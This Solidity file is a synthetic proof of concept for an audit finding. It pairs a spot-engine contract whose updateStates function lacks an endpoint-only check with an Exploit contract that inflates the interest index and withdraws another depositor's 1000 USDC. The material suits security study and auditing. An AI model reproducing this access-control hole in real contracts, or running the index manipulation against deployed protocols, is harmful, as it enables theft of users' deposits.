// SPDX-License-Identifier: MIT
pragma solidity ^0.8.27;

/*  Vertex spot engine — updateStates has no onlyEndpoint
    (OtterSec / Shiva Shankar, AuditVault 48377).
    SYNTHETIC, cheatcode-free. Two deposits of 1000 USDC sit at index 1.
    A same-block endpoint would pass dt = 0. updateStates accepts any dt.
    One year at 100% doubles the index. The caller withdraws 2000 and
    leaves the other depositor's 1000 unbacked. The endpoint path pays 1000. */

uint256 constant UNIT = 1_000_000_000;

contract Usdc {
    mapping(address => uint256) public balanceOf;
    address public immutable minter;

    constructor() {
        minter = msg.sender;
    }

    function mint(address to, uint256 amount) external {
        require(msg.sender == minter, "minter");
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
    }
}

contract SpotEngine {
    uint256 public constant YEAR = 365 days;
    uint256 public constant WAD = 1e18;

    Usdc public usdc;
    address public endpoint;
    uint256 public index = 1e18;
    mapping(address => uint256) public shares;

    constructor(address endpoint_) {
        usdc = new Usdc();
        endpoint = endpoint_;
    }

    function seed(address user, uint256 amount) external {
        usdc.mint(address(this), amount);
        shares[user] += amount * WAD / index;
    }

    function updateStates(uint256 dt) external {
        // @> VULN: any caller can pass dt. onlyEndpoint is missing.
        index += index * dt / YEAR;
    }

    function updateStatesAsEndpoint(uint256 dt) external {
        require(msg.sender == endpoint, "onlyEndpoint");
        index += index * dt / YEAR;
    }

    function withdraw() external returns (uint256 amount) {
        uint256 owned = shares[msg.sender];
        amount = owned * index / WAD;
        shares[msg.sender] = 0;
        usdc.transfer(msg.sender, amount);
    }
}

contract Exploit {
    address public constant LENDER = address(0xB0B);

    SpotEngine public engine;
    Usdc public usdc;
    uint256 public taken;
    uint256 public fair;
    uint256 public lenderShares;
    uint256 public cashLeft;

    constructor() {
        engine = new SpotEngine(address(this));
        usdc = engine.usdc();
        engine.seed(LENDER, UNIT);
        engine.seed(address(this), UNIT);
    }

    function run() external {
        require(engine.index() == 1e18, "index 1");
        require(usdc.balanceOf(address(engine)) == UNIT * 2, "both deposited");
        require(engine.shares(address(this)) == UNIT, "own shares");
        engine.updateStates(365 days);
        require(engine.index() == 2e18, "index doubled");
        fair = UNIT;
        taken = engine.withdraw();
        lenderShares = engine.shares(LENDER);
        cashLeft = usdc.balanceOf(address(engine));
        require(taken == UNIT * 2, "withdrew 2000");
        require(cashLeft == 0, "cash gone");
        require(lenderShares == UNIT, "lender still owed 1000");
        require(taken - fair == UNIT, "1000 is the lender's cash");
    }
}
